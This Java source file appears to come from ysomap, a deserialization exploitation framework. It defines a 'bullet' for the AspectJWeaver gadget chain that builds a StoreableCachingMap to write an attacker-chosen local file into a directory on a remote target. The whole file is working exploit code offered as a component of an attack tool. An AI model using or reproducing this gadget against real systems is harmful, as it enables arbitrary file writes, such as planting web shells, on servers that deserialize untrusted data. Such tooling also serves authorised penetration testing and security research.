package ysomap.bullets.aspectjweaver;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3p1g
 * @since 2021/7/30
 */
@Bullets
@Dependencies({"org.aspectj:aspectjweaver:1.9.2"})
@Details("指定目录文件写入")
@Authors({ Authors.JANG })
public class StoreableCachingMapBullet implements Bullet<Object> {

    @NotNull
    @Require(name="remoteFolder",detail="远程目标写入的目录")
    public String remoteFolder = ".";

    @NotNull
    @Require(name="filename",detail="生成的文件名")
    public String filename;

    @NotNull
    @Require(name="localFilepath",detail="需要写入的本地文件路径")
    public String localFilepath;


    @Override
    public Object getObject() throws Exception {

        return ReflectionHelper
                .newInstance("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap",
                        new Class[]{String.class, int.class},
                        new Object[]{remoteFolder, 12});
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new StoreableCachingMapBullet();
        bullet.set("remoteFolder", args[0]);
        bullet.set("filename", args[1]);
        bullet.set("localFilepath", args[2]);
        return bullet;
    }
}
